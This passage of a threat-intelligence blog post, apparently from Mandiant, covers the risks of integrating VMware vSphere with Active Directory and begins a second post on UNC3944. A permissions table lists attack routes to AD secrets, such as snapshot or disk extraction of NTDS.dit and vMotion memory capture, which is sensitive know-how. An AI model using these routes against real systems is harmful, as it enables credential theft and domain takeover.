margin-left: auto; margin-right: auto;\"><colgroup><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroupAutoAdd from true to </span><strong style=\"font-style: italic; vertical-align: baseline;\">false</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.vimsvc.authValidateInterval from 1440 to </span><strong style=\"font-style: italic; vertical-align: baseline;\">90</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroup </span><strong style=\"font-style: italic; vertical-align: baseline;\">no change </strong><span style=\"font-style: italic; vertical-align: baseline;\">\"ESX Admins\"  </span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Integrating an ESXi host with Microsoft AD introduces a fundamental security issue that is often overlooked—the IdP's administrators effectively gain administrative control over the ESXi host and any other system relying on that trust. While a common perception, sometimes reinforced by narratives focusing on the endpoint, suggests the ESXi host itself is the primary vulnerability, the more critical security concern is the implicit, far-reaching administrative power wielded by the administrators of the trusted IdP, particularly when using AD authentication with ESXi.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Administrators of Active Directory implicitly become administrators of any ESXi host that trusts it.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Consequently, neither workarounds nor configuration fixes, which only adjust default settings, resolve this core problem when an ESXi host is joined to AD. The issue transcends specific CVEs; it stems from the inherent security implications of the implicit trust model itself, particularly when it involves systems like ESXi and AD, which already possess their own security vulnerabilities and are frequent targets for threat actors.</span></p>\n<p><span style=\"vertical-align: baseline;\">In respect of ESXi, context should be applied to the following: </span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Automatic full administrative access</strong><span style=\"vertical-align: baseline;\">: When ESXi hosts are joined to AD, a default (or custom configured) AD group (e.g., \"ESX Admins\") is granted full root-level administrative privileges on the ESXi hosts. Any member of this AD group instantly gains unrestricted control of the ESXi host.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Group name</strong><span style=\"vertical-align: baseline;\">: If AD is compromised, threat actors can manipulate </span><strong style=\"font-style: italic; vertical-align: baseline;\">any</strong><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">group name used for via the the </span><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroup </span><span style=\"vertical-align: baseline;\">advanced setting, This is not limited to the group name “ESX Admins.”</span></li>\n<li><strong style=\"vertical-align: baseline;\">Lack of security identifier (SID) tracking:</strong><span style=\"vertical-align: baseline;\"> AD group names (not limited to “ESX Admins”) added to ESXi are not tracked by their SIDs. This means that a threat actor could rename or recreate a deleted AD group such as “ESX Admins” maintaining the same name in ESXi via Config.HostAgent.plugins.hostsvc.esxAdminsGroup and retain the elevated privileges. This is a limitation of the Likewise ESXi agent.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Active Directory group management. </strong><span style=\"vertical-align: baseline;\">Any threat actor looking to access a domain-joined ESXi host would need to simply require sufficient permissions to add themselves to the AD group defined via </span><span style=\"font-style: italic; vertical-align: baseline;\">Config.HostAgent.plugins.hostsvc.esxAdminsGroup.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Recent discussions around vulnerabilities like CVE-2024-37085 have brought this security issue to the forefront: the inherent dangers of joining vSphere ESXi hosts directly to an AD domain. While such integration offers perceived management convenience, it establishes a level of trust that can be easily exploited.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Why Your ESXi Hosts Should Never Be Active Directory Domain Joined</span></h2>\n<p><span style=\"vertical-align: baseline;\">Based on previous discussions we can confidently establish that joining an ESXi host to AD carries substantial risk. This is further endorsed where there is an absence of comprehensive ESXi security controls such as Secure Boot, TPM, execInstalledOnly, vCenter integration, comprehensive logging and SIEM integration. Compromised AD credentials tied to an ESXi-joined group will allow remote threat actors to readily exploit the elevated privileges, executing actions such as virtual machine shutdown and ransomware deployment via SSH. These risks can be summarized as follows:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">No MFA support: </strong><span style=\"vertical-align: baseline;\">ESXi does not support MFA for AD users. Domain joining exposes critical hypervisor access to single-factor password-based authentication.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Legacy authentication protocols: </strong><span style=\"vertical-align: baseline;\">ESXi relies on IWA and Kerberos / NTLM / Windows Session Authentication (SSPI)—outdated protocols vulnerable to various attacks, including pass-the-hash and credential relay.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Likewise agent is deprecated: </strong><span style=\"vertical-align: baseline;\">The underlying Likewise agent is a discontinued open-source project. Continued reliance on it introduces maintenance and security risks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">No modern authentication integration: </strong><span style=\"vertical-align: baseline;\">ESXi does not support federated identity, SAML, OIDC, FIDO2, or conditional access. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AD policy enforcement is absent: </strong><span style=\"vertical-align: baseline;\">Group Policy Objects (GPOs), conditional access, and login time restrictions do not extend to ESXi via AD join, undermining centralized security controls.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Complexity without benefit: </strong><span style=\"vertical-align: baseline;\">Domain joining adds administrative overhead without offering meaningful security gains — especially when using vCenter as the primary access point.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Limited role mapping granularity: </strong><span style=\"vertical-align: baseline;\">Group-based role mappings on ESXi are basic and cannot match the RBAC precision available in vCenter, reducing access control fidelity.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To securely remove ESXi hosts from AD, a multistep process is required to shift access management explicitly to vCenter. This involves assessing current AD usage, designing granular vCenter roles, configuring vCenter's RBAC, removing hosts from the domain via PowerCLI, and preventing future AD re-integration. All management then moves to vCenter, with direct ESXi access minimized. This comprehensive approach prioritizes security and efficiency by moving away from AD reliance for ESXi authentication and authorization towards a vCenter-centric, granular RBAC model. vSphere explicitly discourages joining ESXi hosts to AD:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 99.9641%;\">\n<tbody>\n<tr>\n<td style=\"width: 98.1839%;\">\n<p><span style=\"font-style: italic; vertical-align: baseline;\">“</span><span style=\"font-style: italic; vertical-align: baseline;\">ESXi can be joined to an Active Directory domain as well, and that functionality continues to be supported. We recommend directing all configuration &amp; usage through the Role-Based Access Controls (RBAC) present in vCenter Server, though.\"</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Source: <a href=\"https://blogs.vSphere.com/vsphere/2020/05/vsphere-7-integrated-windows-authentication-iwa-ldap.html\" rel=\"noopener\" target=\"_blank\">VMware</a></span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">vSphere Virtual Center — The Primary Target</span></h2>\n<p><span style=\"vertical-align: baseline;\">vSphere vCenter Server represents a strategic objective for threat actors due to its authoritative role as the centralized management for virtualized infrastructure. A compromised vCenter instance effectively cedes comprehensive administrative control over the entire virtual estate, encompassing all connected ESXi hypervisors, virtual machines, datastores, and virtual network configurations. </span></p>\n<p><span style=\"vertical-align: baseline;\">Through its extensive Application Programming Interfaces (APIs), adversaries can programmatically manipulate all managed ESXi hosts and their resident virtual machines, enabling actions such as mass ransomware deployment, large-scale data exfiltration, the provisioning of rogue virtual assets, or the alteration of security postures to evade detection and induce widespread operational disruption. </span></p>\n<p><span style=\"vertical-align: baseline;\">Furthermore, the vCenter Server appliance itself can be subverted by implanting persistent backdoors, thereby establishing covert command-and-control (C2) channels that allow for entrenched persistence and continued malicious operations. Consequently, its critical function renders vCenter a high-value target. The following should be considered:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Coupled security dependency (compromise amplification risk): </strong><span style=\"vertical-align: baseline;\">Directly linking vCenter to AD makes vSphere security dependent on AD's integrity. As AD is a prime target, compromising privileged AD accounts mapped to vCenter grants immediate, potentially unrestricted administrative access to the virtual infrastructure, bypassing vSphere-specific security layers. Insufficient application of least privilege for AD accounts in vSphere magnifies this risk.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Single-factor authentication weakness (credential compromise risk): </strong><span style=\"vertical-align: baseline;\">Relying solely on AD password validation makes vCenter highly vulnerable to common credential compromise methods (phishing, brute-force, spraying, stuffing, malware). Without mandatory MFA, a single stolen password for a privileged AD account allows complete authentication bypass, enabling unauthorized access, data breaches, ransomware, or major disruptions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Lack of native MFA: </strong><span style=\"vertical-align: baseline;\">The direct vsphere.local-to-AD integration offers no built-in enforcement of strong authentication like phishing resistant FIDO2 . While compatibility exists for external systems (Smart Cards, RSA SecurID), these require separate, dedicated infrastructure and are not inherent features, leaving a significant authentication assurance gap if unimplemented.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Facilitation of lateral movement and privilege escalation: </strong><span style=\"vertical-align: baseline;\">Compromised AD credentials, even non-administrative ones with minimal vSphere rights, allow threat actors initial vCenter access. vCenter can then be exploited as a pivot point for further network infiltration, privilege escalation within the virtual environment, or attacks on guest systems via console/API access, all stemming from the initial single-factor credential compromise.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Integrating vSphere vCenter directly with AD for identity management, while common, inherently introduces significant security vulnerabilities stemming from coupled dependencies, reliance on single-factor authentication, a lack of native strong MFA, and facilitated attack pathways. These not only critically expose the virtual infrastructure but also provide avenues to exploit the VCSA appliance's attack surface, such as its underlying Linux shell and the lack of comprehensive endpoint detection and response (EDR) capabilities.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Securing vSphere: The Tier 0 Challenge</span></h2>\n<p><span style=\"vertical-align: baseline;\">The widespread practice of running Tier 0 services—most critically, AD domain controllers (often used for direct Identity integration)—directly on vSphere hypervisors introduces a significant and often overlooked security risk. By placing Active Directory Domain Controllers on vSphere, any successful attack against the hypervisor effectively hands threat actors the keys to the entire AD environment, enabling complete domain takeover. Mandiant observes that a general lack of awareness and proactive mitigation persists.</span></p>\n<p><span style=\"vertical-align: baseline;\">The danger is significant and present, for example, even for vSphere permissions that appear low-risk or are operationally common. For example, the privilege to snapshot an AD virtual machine can be weaponized for complete AD takeover. This specific vSphere capability, often assigned for backup routines, enables offline NTDS.dit (AD database) exfiltration. This vSphere-level action renders many in-guest Windows Server security controls ineffective, bypassing not only traditional measures like strong passwords and MFA, but also advanced protections such as LSASS credential guard and EDR, which primarily monitor activity </span><span style=\"font-style: italic; vertical-align: baseline;\">within</span><span style=\"vertical-align: baseline;\"> the operating system. This effectively paves a direct route to full domain compromise for a threat actor possessing this specific permission. </span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant observed these tactics, techniques, and procedures (TTPs) attributed to various ransomware groups across multiple incidents. The absence of VM encryption and logging makes this a relatively simple task to obtain the AD database while being undetected.</span></p>\n<p><span style=\"vertical-align: baseline;\">The following table contains a list of sample threats matched to related permissions:</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Threat </strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Risk</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Minimum vSphere Permission Required</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Unencrypted vMotion</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Memory-in-transit (e.g., LSASS, krbtgt hashes) can be captured during migration.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role:</strong><span style=\"vertical-align: baseline;\"> Virtual Machine Power User or higher </span><strong style=\"vertical-align: baseline;\">Permission</strong><span style=\"vertical-align: baseline;\">: Host &gt; Inventory &gt; Migrate powered on virtual machine</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Unencrypted VM Disks</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">AD database (NTDS.dit), registry hives, and password hashes can be stolen from VMDKs.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role</strong><span style=\"vertical-align: baseline;\">: Datastore Consumer, VM Admin or higher. </span><strong style=\"vertical-align: baseline;\">Permission </strong><span style=\"vertical-align: baseline;\">Datastore &gt; Browse, Datastore &gt; Low level file operations</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Snapshot Creation</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Snapshots preserve memory and disk state; can be used to extract in-memory credentials.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role</strong><span style=\"vertical-align: baseline;\">: Virtual Machine Power User or higher. </span><strong style=\"vertical-align: baseline;\">Permission</strong><span style=\"vertical-align: baseline;\">: Virtual Machine &gt; State &gt; Create Snapshot</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Mounting VMDK to another VM</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Enables offline extraction of AD secrets (e.g., NTDS.dit, registry, SYSVOL).</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role</strong><span style=\"vertical-align: baseline;\">: VM Admin or custom with disk-level access. </span><strong style=\"vertical-align: baseline;\">Permission </strong><span style=\"vertical-align: baseline;\">Virtual Machine &gt; Configuration &gt; Add existing disk, Datastore &gt; Browse</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Exporting / Cloning VM</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Enables offline AD analysis, allowing credential extraction or rollback attacks.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role</strong><span style=\"vertical-align: baseline;\">: Virtual Machine Administrator or higher. </span><strong style=\"vertical-align: baseline;\">Permission: </strong><span style=\"vertical-align: baseline;\">Virtual Machine &gt; Provisioning &gt; Clone, Export OVF Template</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Console Access (VMRC / Web Console)</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Full keyboard/video access enables manual attacks or credential harvesting.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role</strong><span style=\"vertical-align: baseline;\">: Virtual Machine User or higher. </span><strong style=\"vertical-align: baseline;\">Permission:</strong><span style=\"vertical-align: baseline;\"> Virtual Machine &gt; Interaction &gt; Console interaction</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">vNIC on Improper VLAN</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">VM exposed to lateral movement or direct attack from compromised systems.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role:</strong><span style=\"vertical-align: baseline;\"> Virtual Machine Admin or custom. </span><strong style=\"vertical-align: baseline;\">Permission</strong><span style=\"vertical-align: baseline;\">: Virtual Machine &gt; Configuration &gt; Modify device settings</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Copy/Paste via vSphere Tools</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Silent exfiltration of credentials/scripts via clipboard or drag/drop.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">No specific vCenter privilege — host config or tools policy used</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">BIOS/Boot Order Abuse</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ISO boot enables password resets, security bypass, or persistence.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Role:</strong><span style=\"vertical-align: baseline;\"> Virtual Machine Admin or custom. </span><strong style=\"vertical-align: baseline;\">Permission:</strong><span style=\"vertical-align: baseline;\"> Virtual Machine &gt; Configuration &gt; Modify device settings</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Delegation of trust from vSphere vCenter to AD grants implicit administrator privileges on the trusted systems to any AD domain administrator. This elevates the risk profile of AD compromise, impacting the entire infrastructure. To mitigate this, implement a two-pronged strategy: first, create a separate, dedicated vSphere environment specifically for the most critical Tier 0 assets, including AD. This isolated environment should be physically or logically separated from other systems and highly secured with robust network segmentation. Second, implement a zero-trust security model for the control plane of this environment, verifying every access request regardless of source. Within this isolated environment, deploy a dedicated \"infrastructure-only\" IdP (on-premises or cloud). Implementing the principle of least privilege is paramount. </span></p>\n<p><span style=\"vertical-align: baseline;\">A dedicated, isolated vSphere environment for Tier 0 assets (e.g., Active Directory) should have strictly limited administrative access (via a PAW), granting permissions only to those directly managing the infrastructure. This significantly reduces the impact of a breach by preventing lateral movement and minimizing damage. Unnecessary integrations should be avoided to maintain the environment's security and adhere to the least-privilege model.</span></p>\n<p><span style=\"vertical-align: baseline;\">To effectively safeguard critical Tier 0 assets operating within the vSphere environment–specifically systems like Privileged Access Management (PAM), Security Information and Event Management (SIEM) virtual appliances, and any associated AD tools deployed as virtual appliances–a multilayered security approach is essential. These assets must be treated as independent, self-sufficient environments. This means not only isolating their network traffic and operational dependencies but also, critically, implementing a dedicated and entirely separate identity provider (IdP) for their authentication and authorization processes. For the highest level of assurance, these Tier 0 virtual machines should be hosted directly on dedicated physical servers. This practice of physical and logical segregation provides a far greater degree of separation than shared virtualized environments. </span></p>\n<p><span style=\"vertical-align: baseline;\">The core objective here is to break the authorization dependency chain, ensuring that credentials or permissions compromised elsewhere in the network cannot be leveraged to gain access to these Tier 0 systems. This design creates defense in depth security barriers, fundamentally reducing the likelihood and impact of a complete system compromise.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">Mandiant has observed that threat actors are increasingly targeting vSphere, not just for ransomware deployment, but also as a key avenue for data exploitation and exfiltration. This shift is demonstrated by recent threat actor activity observed by GTIG, where adversaries have leveraged compromised vSphere environments to exfiltrate sensitive data such as AD databases before or alongside ransomware execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">As this document has detailed, the widespread reliance on vSphere, coupled with often underestimated risks inherent in its integration with AD and the persistence of insecure default configurations, creates a dangerously vulnerable landscape. Threat actors are not only aware of these weaknesses but are actively exploiting them with sophisticated attacks increasingly targeting ESXi and vCenter to achieve maximum impact.</span></p>\n<p><span style=\"vertical-align: baseline;\">The usability and stability that make vSphere a foundational standard for on-premise and private clouds can be misleading; they do not equate to inherent security. The evolution of the threat landscape, particularly the direct targeting of the hypervisor layer which bypasses traditional endpoint defenses, necessitates a fundamental shift in how vSphere security is approached. Relying on outdated practices, backups, perimeter defenses alone, or assuming EDR on guest VMs provides sufficient protection for the underlying infrastructure creates significant security gaps and exposes an organization to severe risks.</span></p>\n<p><span style=\"vertical-align: baseline;\">Identity integration vulnerabilities will be exploited, therefore, organizations are strongly urged to immediately assess their vSphere environment's AD integration status and decisively prioritize the implementation of the mitigation strategies outlined in this document. This proactive stance is crucial to effectively counter modern threats and includes:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Decoupling critical dependencies:</strong><span style=\"vertical-align: baseline;\"> Severing direct ESXi host integration with AD is paramount to shrinking the AD attack surface.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Modernizing authentication:</strong><span style=\"vertical-align: baseline;\"> Implementing robust, phishing-resistant MFA for vCenter, preferably via identity federation with modern IdPs, is no longer optional but essential.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Systematic hardening:</strong><span style=\"vertical-align: baseline;\"> Proactively addressing the insecure defaults for ESXi and vCenter, enabling features like execInstalledOnly, Secure Boot, TPM, Lockdown Mode, and configuring stringent firewall rules.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enhanced visibility:</strong><span style=\"vertical-align: baseline;\"> Implementing comprehensive remote logging for both ESXi and vCenter, feeding into a SIEM with use cases specifically designed to detect hypervisor-level attacks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Protecting Tier 0 assets:</strong><span style=\"vertical-align: baseline;\"> Strategically isolating critical workloads like Active Directory Domain Controllers in dedicated, highly secured vSphere environments with strict, minimized access controls and encrypted VMs and vMotion.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">The upcoming </span><a href=\"https://blogs.vmware.com/cloud-foundation/2025/03/31/reminder-vsphere-7-to-reach-end-of-service-october-2-2025/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">end-of-life for vSphere 7 in October 2025</span></a><span style=\"vertical-align: baseline;\"> means that vast numbers of organizations will not be able to receive product support, security patches and updates for a product that underpins Infrastructure. This presents a critical juncture for organizations and a perfect storm for threat actors. The transition away from vSphere 7 should be viewed as a key opportunity to re-architect for security, not merely a routine upgrade to implement new features and obtain support. Failure to proactively address these interconnected risks by implementing these recommended mitigations will leave organizations exposed to targeted attacks that can swiftly cripple their entire virtualized infrastructure, leading to operational disruption and financial loss. The time to adopt a resilient, defense-in-depth security posture to protect these critical vSphere environments is unequivocally now.</span></p></div>"}
{"source": "Threat Intelligence", "title": "From Help Desk to Hypervisor: Defending Your VMware vSphere Estate from UNC3944", "link": "https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944/", "published": "Wed, 23 Jul 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Introduction</span></h2>\n<p><span style=\"vertical-align: baseline;\">In mid 2025, Google Threat Intelligence Group (GTIG) identified a sophisticated and aggressive cyber campaign targeting multiple industries, including retail, airline, and insurance. This was the work of UNC3944, a financially motivated threat group that has exhibited overlaps with public reporting of \"0ktapus,\" \"Octo Tempest,\" and \"Scattered Spider.\" Following </span><a href=\"https://x.com/FBI/status/1938746767031574565\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public alerts from the Federal Bureau of Investigation (FBI)</span></a><span style=\"vertical-align: baseline;\">, the group's targeting became clear. GTIG observed that the group was suspected of turning its ransomware and extortion operations to the U.S. retail sector. The campaign soon broadened further, with airline and transportation organizations in North America having also become targets.</span></p>\n<p><span style=\"vertical-align: baseline;\">The group's core tactics have remained consistent and do not rely on software exploits. Instead, they use a proven playbook centered on phone calls to an IT help desk. The actors are aggressive, creative, and particularly skilled at using social engineering to bypass even mature security programs. Their attacks are not opportunistic but are precise, campaign-driven operations aimed at an organization's most critical systems and data.</span></p>\n<p><span style=\"vertical-align: baseline;\">Their strategy is rooted in a \"living-off-the-land\" (LoTL) approach. After using social engineering to compromise one or more user accounts, they manipulate trusted administrative systems and use their control of Active Directory as a launchpad to pivot to the VMware vSphere environment, thus providing an avenue to exfiltrate data and deploy ransomware directly from the hypervisor. This method is highly effective as it generates few traditional indicators of compromise (IoCs) and bypasses security tools like endpoint detection and response (EDR), which often have limited or no visibility into the ESXi hypervisor and vCenter Server Appliance (VCSA).</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog post provides a deep dive into the anatomy of UNC3944's vSphere-centric attacks and outlines a fortified, multi-pillar defense strategy required for mitigation. Learn more about the <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vsphere-active-directory-integration-risks\" rel=\"noopener\" target=\"_blank\">risks associated with integrating VMware vSphere with Microsoft Active Directory</a><span style=\"vertical-align: baseline;\">. Additionally, register for our <a href=\"https://www.brighttalk.com/webcast/7451/648354?utm_source=blog\" rel=\"noopener\" target=\"_blank\">upcoming webinar to learn these strategies directly from Mandiant experts</a>.</span></span></p>\n<h2><span style=\"vertical-align: baseline;\">vSphere Logging Fundamentals</span><strong style=\"vertical-align: baseline;\"> </strong></h2>\n<p><span style=\"vertical-align: baseline;\">Before discussing key detection signals and hardening strategies related to UNC3944’s vSphere-related operations, it's important to understand vSphere logging and the distinction between vCenter Events and ESXi host logs. When forwarded to a central syslog server, vCenter Server events and ESXi host logs represent two distinct yet complementary sources of data. Their fundamental difference lies in their scope, origin, and the structured, event-driven nature of vCenter logs versus the 